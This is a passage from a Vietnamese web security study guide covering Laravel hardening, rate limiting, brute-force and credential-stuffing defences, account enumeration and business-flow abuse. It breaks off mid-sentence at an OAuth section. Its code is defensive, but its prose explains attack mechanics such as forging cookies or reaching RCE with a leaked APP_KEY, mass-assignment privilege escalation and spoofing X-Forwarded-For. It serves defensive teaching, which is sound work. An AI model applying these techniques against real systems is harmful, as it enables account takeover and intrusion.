  quyền thay user". Docs Passport: nếu ứng dụng "tuyệt đối cần OAuth2" thì dùng Passport, còn SPA,
  mobile, API token thì dùng Sanctum.
- Passport: docs không còn khuyên dùng *password grant* và *implicit grant* (khớp RFC 9700, xem
  [2.3](#23-oauth-20-và-oidc)); client công khai (SPA, mobile) dùng authorization code + PKCE; máy
  gọi máy dùng client credentials; thiết bị không bàn phím dùng device authorization grant.

*Fortify và starter kit.* Fortify là backend xác thực "headless" (không kèm giao diện): login,
đăng ký, reset password, xác minh email, 2FA TOTP (và passkey ở bản hiện tại). Starter kit của
Laravel dựng giao diện trên nó.

Rate limit login của Fortify có sẵn nhưng phải đọc kỹ **key throttle**. Docs Fortify: mặc định
throttle theo **tổ hợp username + IP**. File `FortifyServiceProvider` sinh ra khi cài định nghĩa:

```php
<?php
declare(strict_types=1);

// app/Providers/FortifyServiceProvider.php, trong boot() (bản stub của Fortify, thêm kiểu)
RateLimiter::for('login', function (Request $request): Limit {
    $throttleKey = Str::transliterate(Str::lower($request->input(Fortify::username())) . '|' . $request->ip());

    return Limit::perMinute(5)->by($throttleKey);
});

RateLimiter::for('two-factor', function (Request $request): Limit {
    return Limit::perMinute(5)->by($request->session()->get('login.id'));
});
```

Hệ quả khi phân tích:

- Key `email|IP` chặn tốt một máy đoán password một tài khoản. Nhưng kẻ tấn công có 1.000 IP thì
  mỗi IP được 5 lần/phút cho **cùng** tài khoản, tức 5.000 lần/phút. Muốn chặn brute force phân tán,
  thêm một limit theo **riêng email** (xem [2.9](#29-chống-lạm-dụng-rate-limit-brute-force-bot)).
- Key chỉ theo IP thì ngược lại: cả văn phòng chung một IP NAT bị chặn lây nhau, còn kẻ có nhiều IP
  vẫn qua.
- Muốn đổi, trỏ `fortify.limiters.login` trong `config/fortify.php` sang limiter của bạn. Docs
  Fortify gợi ý kết hợp throttle, 2FA và WAF.

#### Laravel: CSRF và authorization

Middleware `Illuminate\Foundation\Http\Middleware\PreventRequestForgery` nằm sẵn trong nhóm `web`.
Theo docs Laravel 13 nó kiểm hai lớp:

1. Đọc header `Sec-Fetch-Site` mà trình duyệt hiện đại tự gửi. Nếu là `same-origin`, cho qua ngay.
2. Nếu không kết luận được (trình duyệt cũ, không phải HTTPS vì header này chỉ gửi qua kết nối an
   toàn), quay về kiểm CSRF token truyền thống: field `_token` (`@csrf`), header `X-CSRF-TOKEN`, hoặc
   `X-XSRF-TOKEN` lấy từ cookie `XSRF-TOKEN`. Sai token trả 419.

Cấu hình trong `bootstrap/app.php` qua `$middleware->preventRequestForgery(...)`: `originOnly: true`
(chỉ kiểm origin, sai trả 403), `allowSameSite: true` (cho subdomain cùng site), `except: [...]`.
Chi tiết cơ chế `Sec-Fetch-Site` ở [2.7](#27-header-bảo-mật-csrf-hiện-đại-cors).

- ⚠️ `except` quá rộng mở lỗ hổng. `except: ['webhook/*']` có vẻ vô hại cho tới khi ai đó thêm
  route `webhook/settings` dùng session. `except: ['*']` là tắt CSRF toàn app. OWASP Laravel Cheat
  Sheet: chỉ loại trừ route không trạng thái (API, webhook).
- Webhook (Stripe, cổng thanh toán) không gửi được CSRF token, nên thay CSRF bằng **chữ ký HMAC**:
  verify header chữ ký trên raw body bằng `hash_equals`, kiểm timestamp để chống replay. Docs khuyên
  đặt route webhook ra ngoài nhóm `web` (ví dụ trong `routes/api.php`) thay vì dùng `except`.

Authorization dùng Gate (closure) và Policy (class theo model); cơ chế, bẫy `Gate::before` và vị trí
kiểm tra ở [2.5](#25-authorization-mô-hình-và-tầng-kiểm-tra) và
[05: Auth](05-php-laravel.md#27-các-thành-phần-khác-của-laravel).

#### Laravel: dữ liệu

*Mass assignment* (gán hàng loạt field từ request vào model). Ví dụ kinh điển trong OWASP Laravel
Cheat Sheet: route cập nhật profile gọi `forceFill($request->all())`, bảng `users` có cột
`is_admin`, user gửi thêm `is_admin=1` là thành admin.

- Khai `$fillable` (whitelist). Đừng `$guarded = []` hay `Model::unguard()`.
- Controller đưa `$request->validated()` hoặc `$request->only([...])`, không đưa `$request->all()`.
- `forceFill`/`forceCreate` bỏ qua bảo vệ, chỉ dùng với mảng đã validate.
- `Model::preventSilentlyDiscardingAttributes($this->app->isLocal())` trong `AppServiceProvider`:
  field ngoài `$fillable` ném exception thay vì bị bỏ qua lặng lẽ, lộ nhầm lẫn ngay khi dev.

Chi tiết ở [05: Mass assignment](05-php-laravel.md#37-bảo-mật-đặc-thù-php).

*Encrypted cast.* Khai cast `encrypted` (hoặc `encrypted:array`, `encrypted:collection`,
`encrypted:object`, `AsEncryptedArrayObject`, `AsEncryptedCollection`) là Eloquent tự mã hoá bằng
`APP_KEY` khi lưu và giải mã khi đọc:

```php
<?php
declare(strict_types=1);

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

final class Integration extends Model
{
    protected $fillable = ['name', 'api_secret', 'settings'];

    protected function casts(): array
    {
        return [
            'api_secret' => 'encrypted',        // chuỗi, mã hoá khi lưu
            'settings'   => 'encrypted:array',  // mảng, json_encode rồi mã hoá
        ];
    }
}
```

- Ciphertext dài hơn và không đoán trước độ dài, nên cột phải là `TEXT` trở lên.
- ⚠️ Không `WHERE`, không index, không tìm kiếm được trên cột này (mỗi lần mã hoá ra ciphertext
  khác). Cần tìm theo giá trị (ví dụ tìm user theo số CMND) thì lưu thêm *blind index*: một cột HMAC
  của giá trị với key riêng, query bằng cột đó ([3.3](#33-crypto-ứng-dụng-và-quản-lý-key)).
- ⚠️ Mã hoá ở tầng app bảo vệ khi lộ bản dump DB hay backup, không bảo vệ khi app bị chiếm (app có
  key).
- Đổi `APP_KEY` mà không cấu hình `APP_PREVIOUS_KEYS` là mất khả năng đọc các cột này.

*Cookie.* Middleware `EncryptCookies` trong nhóm `web` mã hoá và ký mọi cookie bằng `APP_KEY`, nên
client không đọc hay sửa được giá trị. `Crypt`/`encrypt()` của Laravel dùng OpenSSL, cipher mặc định
`AES-256-CBC` (khoá `cipher` trong `config/app.php`) và luôn gắn MAC; giá trị bị sửa thì
`decrypt` ném `DecryptException`. Framework cũng hỗ trợ `AES-128-GCM`/`AES-256-GCM`.

#### Laravel: cấu hình

*`APP_KEY`.* Là khoá đối xứng cho: mã hoá cookie (kể cả session cookie), `encrypt()`/`Crypt`,
encrypted cast, signed URL; OWASP Laravel Cheat Sheet kể thêm token reset password. Tạo bằng
`php artisan key:generate` (dùng CSPRNG).

⚠️ Kẻ có `APP_KEY` làm được:

- Giải mã mọi cookie, dữ liệu `encrypt()` và cột encrypted (nếu có thêm bản dump DB).
- **Giả mạo** cookie, session cookie và signed URL hợp lệ, vì họ tự tính được MAC đúng.
- Trước đây: khi cookie hoặc session được serialize kiểu PHP, họ tạo một cookie mã hoá hợp lệ chứa
  payload serialize của gadget chain; app giải mã (MAC đúng) rồi `unserialize`, dẫn tới **RCE**.
  Skeleton Laravel 13 mặc định `'serialization' => 'json'` trong `config/session.php`, và comment
  trong file cảnh báo rằng đặt `'php'` có thể khiến app dính "gadget chain" nếu `APP_KEY` lộ.

*Rotate có kế hoạch* bằng `APP_PREVIOUS_KEYS` (danh sách key cũ, phân tách bằng dấu phẩy): Laravel
luôn **mã hoá** bằng key hiện tại; khi **giải mã** thử key hiện tại trước, thất bại thì thử lần lượt
các key cũ. User không bị đăng xuất, dữ liệu cũ vẫn đọc được.

*Khi phát hiện `APP_KEY` bị lộ*, rotate êm là **chưa đủ**, vì key cũ còn trong `APP_PREVIOUS_KEYS`
thì cookie kẻ tấn công giả mạo bằng key cũ vẫn được giải mã và chấp nhận. Các bước:

1. Sinh key mới. Coi toàn bộ `.env` là đã lộ (key hiếm khi lộ một mình): rotate luôn mật khẩu DB,
   key cổng thanh toán, secret bên thứ ba.
2. Chạy một script một lần (không phải web app) giải mã dữ liệu đã mã hoá lưu lâu dài (cột encrypted,
   giá trị `encrypt()` trong DB) bằng key cũ rồi mã hoá lại bằng key mới.
3. Deploy web app **không** kèm key cũ trong `APP_PREVIOUS_KEYS`. Chấp nhận mọi session cũ mất hiệu
   lực (mọi user đăng nhập lại), signed URL cũ hỏng.
4. Kiểm tra cấu hình serialize (`session.serialization`, cache), đọc log tìm dấu hiệu khai thác
   trong khoảng thời gian key bị lộ, và tìm nguyên nhân lộ (`.env` trong git, debug mode, document
   root sai).

*`APP_DEBUG`.* Docs Laravel: production **luôn** `false`; để `true` là có nguy cơ lộ cấu hình nhạy
cảm cho người dùng. Trang lỗi debug hiển thị stack trace, đoạn code, query, biến môi trường; một
exception là đủ để đọc `APP_KEY` và mật khẩu DB. Ignition (trang lỗi debug của Laravel các bản cũ)
có CVE-2021-3129 (*CVE* là mã định danh công khai của một lỗ hổng): RCE không cần đăng nhập khi
debug mode bật, ảnh hưởng Ignition trước 2.5.2 dùng với Laravel trước 8.4.2. Ở tầng PHP, tương
đương là `display_errors = Off`, `log_errors = On`, `expose_php = Off` (OWASP PHP Configuration Cheat
Sheet).

*Document root.* Web server phải trỏ vào `public/`, chỉ chứa `index.php` và asset. Trỏ vào thư mục
gốc project là `.env`, `.git/`, `storage/logs/laravel.log`, `composer.json` tải được qua URL.

```nginx
server {
    root /var/www/app/public;          # KHÔNG phải /var/www/app
    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
    location = /index.php {             # chỉ chạy PHP cho front controller
        fastcgi_pass unix:/run/php/php-fpm.sock;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
    }
    location ~ /\.(?!well-known) {      # chặn mọi dotfile phòng khi ai đó copy nhầm vào public/
        deny all;
    }
}
```

*Dashboard nội bộ.* Horizon, Telescope, Pulse mặc định chỉ mở ở môi trường `local`; ở môi trường
khác, quyền vào do gate quyết định (`viewHorizon`, `viewTelescope`, `viewPulse`). ⚠️ Đặt
`APP_ENV=local` nhầm trên server, hoặc viết gate trả `true` cho mọi user đã login, là mở dashboard
chứa payload job, query, request (có thể chứa dữ liệu cá nhân và token) cho người ngoài.

```php
<?php
declare(strict_types=1);

// app/Providers/HorizonServiceProvider.php
protected function gate(): void
{
    Gate::define('viewHorizon', function (?User $user = null): bool {
        return $user !== null && in_array($user->email, ['ops@shop.vn'], true);
    });
}
```

Checklist nhanh khi review một project Laravel:

| Kiểm | Sai thường gặp |
|---|---|
| `APP_DEBUG`, `APP_ENV` trên production | `true` / `local` |
| Document root | Trỏ vào thư mục gốc project |
| `.env` trong git history | Có, kèm `APP_KEY` thật |
| `except` của CSRF | Wildcard rộng |
| Model | `$guarded = []`, controller dùng `$request->all()` |
| Token Sanctum | Không đặt `expiration` |
| Key throttle login | Chỉ theo IP |
| Gate của Horizon/Telescope/Pulse | Trả `true` cho mọi user |
| Session/cache serialization | `php` sau khi nâng cấp mà không cân nhắc |

#### Supply chain

- `composer audit`: đối chiếu các package trong `composer.lock` với cơ sở dữ liệu security advisory
  và báo package có lỗ hổng đã công bố. Chạy trong CI.
- Composer 2.9 (11/2025): mặc định **chặn update** sang phiên bản có security advisory đã biết, cấu
  hình qua `audit.block-insecure`. Chặn package bị bỏ rơi (*abandoned*) qua `audit.block-abandoned`,
  cái này **không** bật mặc định. Blog Packagist nói tính năng này thay thế hoàn toàn package
  `roave/security-advisories`. Các bản Composer sau có thay đổi thêm về cấu hình; kiểm tra docs bản
  đang dùng.
- Commit `composer.lock` để mọi môi trường cài đúng cùng phiên bản đã được audit; production chạy
  `composer install --no-dev` (chỉ đọc lock, bỏ dev dependency). Chi tiết ở
  [3.4](#34-secret-và-supply-chain).

**Tóm tắt nhanh**
- PHP: `password_hash` (bcrypt, cost mặc định 12 từ PHP 8.4, rehash lúc login), `random_bytes`/
  `random_int`, `hash_equals`, Sodium thay vì tự ghép OpenSSL; không `unserialize` input, không `==`.
- Chọn xác thực theo client: web thường dùng session; SPA cùng domain dùng Sanctum SPA; mobile,
  script dùng Sanctum token (nhớ đặt hạn); bên thứ ba cần OAuth2 dùng Passport.
- Fortify throttle mặc định theo email + IP, chưa chặn brute force phân tán; thêm limit theo email.
- CSRF: `PreventRequestForgery` kiểm `Sec-Fetch-Site` rồi token; webhook ra khỏi nhóm `web`, verify
  HMAC; `except` hẹp.
- `APP_KEY` lộ: giả mạo cookie, session, signed URL, giải mã dữ liệu; khi lộ thì re-encrypt dữ liệu
  và **bỏ** key cũ, không chỉ rotate êm. `APP_DEBUG=false`, document root `public/`, gate cho dashboard.

**Nguồn**: [PHP: password_hash](https://www.php.net/manual/en/function.password-hash.php) ·
[PHP: password_needs_rehash](https://www.php.net/manual/en/function.password-needs-rehash.php) ·
[PHP 8.4: Other Changes](https://www.php.net/manual/en/migration84.other-changes.php) ·
[PHP: Sodium](https://www.php.net/manual/en/book.sodium.php) ·
[Laravel: Hashing](https://laravel.com/docs/hashing) ·
[Laravel: Encryption](https://laravel.com/docs/encryption#gracefully-rotating-encryption-keys) ·
[Laravel: Encrypted Casting](https://laravel.com/docs/eloquent-mutators#encrypted-casting) ·
[Laravel: Sanctum](https://laravel.com/docs/sanctum#how-it-works) ·
[Laravel: Passport](https://laravel.com/docs/passport) ·
[Laravel: Fortify](https://laravel.com/docs/fortify) ·
[Laravel: CSRF Protection](https://laravel.com/docs/csrf) ·
[Laravel: Mass Assignment](https://laravel.com/docs/eloquent#mass-assignment) ·
[Laravel: Configuration, Debug Mode](https://laravel.com/docs/configuration#debug-mode) ·
[OWASP: Laravel Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Laravel_Cheat_Sheet.html) ·
[OWASP: PHP Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html) ·
[Composer 2.9 release](https://blog.packagist.com/composer-2-9/) ·
[Paragon IE: Using Encryption and Authentication Correctly](https://paragonie.com/blog/2015/05/using-encryption-and-authentication-correctly) ·
mã nguồn `laravel/laravel` 13.x (`config/session.php`, `config/app.php`) và `laravel/fortify`
(`stubs/FortifyServiceProvider.php`)

---

### 2.9 Chống lạm dụng: rate limit, brute force, bot

Module này trả lời: làm sao chặn bot đoán password, dò tài khoản và vắt kiệt các luồng tốn tiền
(OTP, voucher), khi mỗi request riêng lẻ đều trông hoàn toàn hợp lệ. Ý chính cần mang vào phỏng
vấn: không có một lớp nào đủ, phải xếp nhiều lớp và đo được từng lớp.

#### Rate limit nhiều lớp

*Rate limit* là giới hạn số request (hoặc số hành động) cho một *key* trong một khoảng thời gian.
Câu hỏi thiết kế thật sự không phải "bao nhiêu request mỗi phút" mà là **đếm theo key nào**:

| Key | Chặn được | Không chặn được |
|---|---|---|
| IP | Một máy spam | Botnet, proxy dân cư (mỗi IP vài request); còn chặn oan cả văn phòng chung IP NAT |
| Tài khoản / email / số điện thoại | Đoán password một tài khoản dù từ nhiều IP | Credential stuffing (mỗi tài khoản chỉ bị thử một lần) |
| Thiết bị / session / fingerprint | Một client tự động hoá | Client giả fingerprint |
| Endpoint (tổng toàn hệ thống) | Đột biến lưu lượng, hoá đơn SMS vượt trần | Không phân biệt người tốt kẻ xấu, chỉ là cầu chì cuối |

Vì vậy endpoint nhạy cảm (login, gửi OTP, verify OTP, reset password, tìm kiếm, đăng ký) cần
**nhiều limit cùng lúc**, mỗi limit một key. Thuật toán đếm (fixed window, sliding window, token
bucket) ở [09-api-design.md](../09-api-design.md).

```
Request
  |
  v
[Edge/WAF]  theo IP, chặn IP xấu đã biết, ngưỡng rộng
  |
  v
[App: throttle middleware]  theo IP + theo tài khoản + trần toàn endpoint
  |
  v
[Logic nghiệp vụ]  mỗi OTP tối đa N lần nhập sai, mỗi SĐT một voucher, CAPTCHA khi đáng ngờ
```

Ví dụ bộ limit cho login trong Laravel (ngưỡng là ví dụ để minh hoạ cách ghép, tự chỉnh theo lưu
lượng thật):

```php
<?php
declare(strict_types=1);

// app/Providers/AppServiceProvider.php, trong boot()
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;

RateLimiter::for('login', function (Request $request): array {
    $email = Str::lower((string) $request->input('email'));

    return [
        Limit::perMinute(1000)->by('login:all'),                          // cầu chì toàn endpoint
        Limit::perMinute(20)->by('login:ip:' . $request->ip()),           // một IP
        Limit::perHour(10)->by('login:email:' . $email),                  // một tài khoản, mọi IP
    ];
});

// routes/web.php
// Route::post('/login', LoginController::class)->middleware('throttle:login');
```

- Mỗi `by` phải có tiền tố riêng để các limit không đè key của nhau (docs Laravel nhắc đúng điểm này).
- Vượt limit: Laravel trả 429 kèm `Retry-After`; mọi response đi qua `throttle` có
  `X-RateLimit-Limit` và `X-RateLimit-Remaining`.
- `->after(fn (Response $r): bool => ...)` chỉ đếm response thoả điều kiện: đếm lần đăng nhập
  **sai** thay vì mọi lần, hoặc đếm 404 để chống dò id (ví dụ có trong docs Laravel).
- ⚠️ Limit theo email ở trên cũng là công cụ để kẻ xấu làm phiền người khác: gửi 10 lần sai là khoá
  email nạn nhân một giờ. Xem cách giảm ở nhóm dưới.
- ⚠️ Bộ đếm nằm trong cache. Nhiều server mà cache là `file` thì mỗi server đếm riêng; dùng Redis
  (khoá `limiter` trong `config/cache.php`). Docs Laravel: `RateLimiter::increment` tăng nguyên tử
  với store `redis`, `memcached`, `database`, nên kiểm bằng giá trị trả về của `increment` thay vì
  `tooManyAttempts` rồi mới `increment` (hai bước tách rời thì request đồng thời lọt qua).
- ⚠️ Sau load balancer, `$request->ip()` chỉ đúng khi cấu hình *trusted proxies*
  (`$middleware->trustProxies(at: [...])` trong `bootstrap/app.php`). Không cấu hình thì mọi user
  mang IP của load balancer và chung một bộ đếm; tin mọi proxy (`at: '*'`) khi app nhận request
  trực tiếp từ Internet thì kẻ tấn công tự đặt `X-Forwarded-For` để đổi IP tuỳ ý.
- Bộ throttle có sẵn của Laravel là fixed window: dồn request ở cuối cửa sổ này và đầu cửa sổ sau
  thì lọt gấp đôi trong thời gian ngắn ([05: Session và rate limiting](05-php-laravel.md#27-các-thành-phần-khác-của-laravel)).

*OTP* cần giới hạn cả hai chiều:

- Gửi: theo số điện thoại (ví dụ vài lần mỗi giờ), theo IP, theo thiết bị, và một trần chi phí toàn
  hệ thống mỗi ngày kèm cảnh báo.
- Nhập: mỗi mã OTP chỉ cho sai vài lần rồi huỷ mã, bắt gửi mã mới. Mã 6 chữ số có 10^6 khả năng;
  không giới hạn số lần nhập thì bot thử hết trong thời gian mã còn hiệu lực.

#### Brute force và credential stuffing

OWASP phân biệt ba kiểu tấn công tự động vào login:

| Kiểu | Thử gì | Dấu hiệu | Chống chính |
|---|---|---|---|
| *Brute force* | Nhiều password cho **một** tài khoản | Nhiều lần sai trên một tài khoản | Đếm theo tài khoản, độ trễ tăng dần, CAPTCHA sau vài lần sai |
| *Credential stuffing* | Cặp email + password **đã lộ ở site khác**, mỗi cặp thử một lần | Tỉ lệ đăng nhập sai toàn hệ thống tăng vọt, rải trên rất nhiều IP, nhiều email không tồn tại | MFA/passkey, chặn password đã lộ, tín hiệu thiết bị và kết nối, bot detection |
| *Password spraying* | **Một** password yếu phổ biến cho rất nhiều tài khoản | Nhiều tài khoản cùng sai với ít lần mỗi tài khoản | Cấm password phổ biến, MFA, giám sát toàn cục |

*Chống brute force.* OWASP Authentication Cheat Sheet: bộ đếm lần sai phải **gắn với tài khoản**,
không gắn với IP, để kẻ tấn công không lách bằng cách đổi IP. Một chính sách lockout có ba tham số:
số lần sai trước khi khoá (*threshold*), khoảng thời gian tính (*observation window*), và thời gian
khoá (*duration*). Thay vì khoá cố định, có thể khoá tăng theo cấp số nhân (bắt đầu rất ngắn, gấp
đôi sau mỗi lần sai). CAPTCHA thân thiện hơn khi chỉ hiện sau vài lần sai, và OWASP coi nó là lớp
làm chậm, không phải lớp chặn, vì có dịch vụ giải CAPTCHA thuê.

⚠️ Khoá cứng tài khoản sau N lần sai biến tính năng bảo mật thành công cụ *denial of service*: kẻ
xấu cố tình nhập sai để khoá tài khoản của người khác (đối thủ, admin). Giảm bằng:

- Khoá tạm, tăng dần, thay vì khoá vĩnh viễn.
- Thay "khoá" bằng "đòi thêm bằng chứng": CAPTCHA, hoặc bắt buộc MFA cho lần kế.
- OWASP gợi ý vẫn cho user dùng luồng quên mật khẩu để vào lại dù tài khoản đang bị khoá.
- Đếm riêng theo cặp (tài khoản, thiết bị đã từng đăng nhập thành công): thiết bị quen của chủ tài
  khoản không bị khoá lây.

*Credential stuffing* khó hơn vì mỗi request trông như một user gõ nhầm password một lần. Công cụ
kiểu Sentry MBA (OWASP nêu tên) có sẵn tính năng rải request qua mạng proxy lớn, nên mỗi IP chỉ gửi
vài request: **rate limit theo IP và danh sách IP chặn đều bị vô hiệu**. Rate limit theo tài khoản
cũng vô dụng vì mỗi tài khoản chỉ bị thử một lần. Tín hiệu thay thế (theo OWASP Credential Stuffing
Prevention Cheat Sheet):

1. **MFA**: OWASP gọi là phòng thủ tốt nhất, dẫn phân tích của Microsoft rằng MFA chặn được 99,9%
   vụ chiếm tài khoản. Không bắt MFA mọi lúc được thì bật theo rủi ro: thiết bị hay IP mới, quốc gia
   bất thường, IP thuộc proxy/VPN/danh sách xấu, IP đã thử đăng nhập nhiều tài khoản, hành vi giống
   script. Passkey còn tốt hơn vì không có password để nhồi ([2.4](#24-mfa-và-passkey)).
2. **Chặn password đã lộ** khi đăng ký và đổi password, ví dụ qua Pwned Passwords với k-anonymity
   ([1.1](#11-lưu-password)); Laravel có rule `Password::uncompromised()`.
3. **Fingerprint thiết bị**: User-Agent, ngôn ngữ, và qua JavaScript là độ phân giải, font... So với
   thiết bị quen của tài khoản, lạ thì đòi thêm xác thực. Client tự khai nên giả được.
4. **Fingerprint kết nối**: JA3 (dấu vân tay TLS handshake), fingerprint HTTP/2, thứ tự header. Khó
   giả hơn: User-Agent nói là iPhone mà TLS handshake giống thư viện Python là đáng ngờ.
5. **Phân loại IP**: IP dân cư khác IP của nhà cung cấp hosting; AWS và nhiều cloud công bố dải IP.
   Dùng làm tín hiệu chấm điểm, không làm luật chặn duy nhất.
6. **Làm khó công cụ tự động**: login nhiều bước, bắt chạy JavaScript để sinh token, bắt giải
   proof-of-work. OWASP lưu ý: bắt JavaScript làm giảm khả năng truy cập (screen reader), và luồng
   nhiều bước không được tạo ra chỗ dò tài khoản.
7. **Báo cho user**: login đúng password nhưng rớt ở bước MFA thì báo user đổi password (password
   đã lộ); hiển thị lần đăng nhập trước và danh sách session để user tự thu hồi.
8. **Metric**: mỗi lớp phòng thủ phải xuất số lượng phát hiện và đã chặn. Credential stuffing lộ ra
   ở metric toàn cục (tỉ lệ login sai của cả hệ thống, tỉ lệ "email không tồn tại"), không lộ ra ở
   từng tài khoản.

#### Account enumeration

*Account enumeration* là dò ra email hay username nào có tài khoản. Kẻ tấn công dùng danh sách này
để nhắm credential stuffing, phishing, hoặc chỉ để biết một người có dùng dịch vụ của bạn (dịch vụ
nhạy cảm thì đây đã là lộ thông tin). OWASP gọi chỗ khác biệt giữa hai trường hợp là *discrepancy
factor*; nó lộ ra ở:

| Chỗ lộ | Sai | Đúng |
|---|---|---|
| Thông báo login | "Sai mật khẩu cho user foo", "Tài khoản đã bị khoá" | "Email hoặc mật khẩu không đúng" |
| Quên mật khẩu | "Email này không có trong hệ thống" | "Nếu email có trong hệ thống, chúng tôi đã gửi link đặt lại" |
| Đăng ký | "Email đã được sử dụng" | "Chúng tôi đã gửi link kích hoạt tới email này" (email đã có thì gửi thư khác, ví dụ "bạn đã có tài khoản, đăng nhập tại đây") |
| HTTP status | 200 khi đúng, 403 khi sai tài khoản, 401 khi sai password | Cùng status cho mọi thất bại |
| Thời gian phản hồi | User không tồn tại trả lỗi ngay, user tồn tại chạy bcrypt vài chục đến vài trăm ms | Luôn chạy một lần hash |

Bẫy thời gian phản hồi rất phổ biến, kể cả trong ví dụ của docs. Đoạn code mẫu cấp token cho mobile
trong docs Sanctum viết `if (! $user || ! Hash::check(...))`: khi user không tồn tại, `||` dừng
ngay, không chạy bcrypt, nên response nhanh hơn thấy rõ. Cách sửa là luôn hash:

```php
<?php
declare(strict_types=1);

use App\Models\User;
use Illuminate\Support\Facades\Hash;

final class CredentialChecker
{
    // Tạo một lần bằng Hash::make('dummy') với cùng thuật toán và cost như password thật.
    private const DUMMY_HASH = '$2y$12$...';   // điền hash thật, không để chuỗi rút gọn này

    public function check(string $email, string $password): ?User
    {
        $user = User::where('email', $email)->first();

        // Luôn chạy bcrypt đúng một lần, dù user có tồn tại hay không.
        $valid = Hash::check($password, $user?->password ?? self::DUMMY_HASH);

        return ($user !== null && $valid) ? $user : null;
    }
}
```

- Thông điệp chung làm UX kém hơn; OWASP để đội tự cân theo độ nhạy của ứng dụng. Chỗ không thể trả
  thông điệp chung (form đăng ký phải báo email trùng) thì bù bằng rate limit và CAPTCHA để kẻ tấn
  công không dò được **ở quy mô lớn**.
- Gửi email trong request quên mật khẩu cũng tạo chênh lệch thời gian; đẩy việc gửi vào queue để
  hai nhánh trả về nhanh như nhau.

#### Đào sâu (🔴): lạm dụng luồng nghiệp vụ

*API6:2023 Unrestricted Access to Sensitive Business Flows*: API để lộ một luồng nghiệp vụ mà nếu
bị dùng hàng loạt sẽ gây hại cho doanh nghiệp, dù từng request đều hợp lệ và đúng quyền. Không có
bug kỹ thuật nào để vá; lỗ hổng là **thiếu giới hạn theo nghiệp vụ**. Ví dụ trong OWASP:

- Mua hàng: bot mua gần hết lô máy chơi game phát hành giới hạn, rải trên nhiều IP, rồi bán lại giá
  cao (*scalping*).
- Đặt chỗ: đặt 90% ghế chuyến bay (huỷ miễn phí), sát ngày huỷ hết để hãng phải giảm giá, rồi mua
  một vé rẻ.
- Giới thiệu bạn bè: script tự đăng ký hàng loạt tài khoản để cộng credit vào ví kẻ tấn công.
- Thêm ở Việt Nam hay gặp: spam tạo tài khoản ăn voucher người mới, và *SMS pumping*, tức dùng form
  gửi OTP để bắn SMS tới dải số của kẻ gian ăn chia cước ([2.4](#24-mfa-và-passkey)).

OWASP chia cách chống thành hai tầng:

1. **Nghiệp vụ**: xác định luồng nào gây hại khi bị dùng quá mức. Đây là việc cần product và
   business cùng ngồi, không phải việc riêng của dev.
2. **Kỹ thuật**: chọn cơ chế làm chậm tự động hoá:
   - Fingerprint thiết bị, từ chối client bất thường (ví dụ headless browser) để buộc kẻ tấn công
     dùng công cụ đắt hơn.
   - Phát hiện con người: CAPTCHA, hoặc sinh trắc hành vi (nhịp gõ phím).
   - Phát hiện mẫu không phải người: từ "thêm vào giỏ" tới "thanh toán" dưới một giây.
   - Cân nhắc chặn IP của Tor exit node và proxy đã biết.
   - API cho máy gọi (B2B, API cho developer) thường thiếu các lớp trên nên phải giới hạn riêng.

Trong thiết kế thực tế, thêm:

- Giới hạn theo **thực thể nghiệp vụ**, không theo request: mỗi số điện thoại, mỗi thẻ thanh toán,
  mỗi địa chỉ giao hàng một voucher; mỗi user tối đa N sản phẩm flash sale.
- Trì hoãn phần thưởng: credit giới thiệu chỉ cộng sau khi người được giới thiệu có đơn hàng thật.
- *Challenge có chọn lọc*: chỉ hiện CAPTCHA hay bắt xác minh khi điểm rủi ro cao, người dùng bình
  thường không bị làm phiền.
- *Metric bất thường*: số OTP gửi theo đầu số quốc gia, số tài khoản mới mỗi giờ, tỉ lệ voucher dùng
  trên tài khoản mới. Đặt cảnh báo và trần chi phí cứng (SMS mỗi ngày) như cầu chì.

**Tóm tắt nhanh**
- Rate limit là chọn **key**: IP, tài khoản, thiết bị, toàn endpoint; endpoint nhạy cảm cần nhiều
  limit cùng lúc, bộ đếm dùng chung (Redis), IP chỉ đúng khi cấu hình trusted proxies.
- Brute force: đếm theo tài khoản, độ trễ tăng dần, CAPTCHA sau vài lần sai; khoá cứng là tự tạo
  DoS cho kẻ xấu dùng.
- Credential stuffing rải trên hàng nghìn IP, mỗi tài khoản thử một lần: chặn IP vô dụng; dùng MFA
  theo rủi ro/passkey, chặn password đã lộ, fingerprint thiết bị và kết nối, metric toàn cục.
- Enumeration: cùng thông điệp, cùng status, cùng thời gian (luôn chạy hash một lần).
- API6: request hợp lệ vẫn gây hại; giới hạn theo thực thể nghiệp vụ, challenge có chọn lọc, metric
  và trần chi phí.

**Nguồn**: [OWASP: Credential Stuffing Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html) ·
[OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) (Authentication and Error Messages, Protect Against Automated Attacks) ·
[OWASP API6:2023 Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/) ·
[Laravel: Rate Limiting](https://laravel.com/docs/rate-limiting) ·
[Laravel: Routing, Rate Limiting](https://laravel.com/docs/routing#rate-limiting) ·
[Laravel: Sanctum, Mobile Application Authentication](https://laravel.com/docs/sanctum#mobile-application-authentication) ·
mã nguồn `laravel/framework` 13.x (`Routing/Middleware/ThrottleRequests.php`)

---

## Chặng 3: Senior

### 3.1 OAuth nâng cao: token gắn người giữ, PAR, SSO

Module này trả lời: khi access token "ai cầm cũng dùng được" không còn đủ (tài chính, open banking,
khách doanh nghiệp), các cơ chế bổ sung là gì, chặn được gì, trả giá gì; và SSO doanh nghiệp qua
SAML có những bẫy nào. Nền tảng OAuth/OIDC ở [2.3](#23-oauth-20-và-oidc), JWT ở [2.1](#21-jwt),
vòng đời token ở [2.2](#22-vòng-đời-token-revocation-refresh-nơi-lưu-bff).

#### Bearer token và sender-constrained token

*Bearer token* (RFC 6750): ai đang giữ token thì dùng được, giống tiền mặt. Server không hỏi "anh
có phải người được cấp token này không". Token lọt ra là bị dùng ngay. RFC 9449 nêu các đường lọt
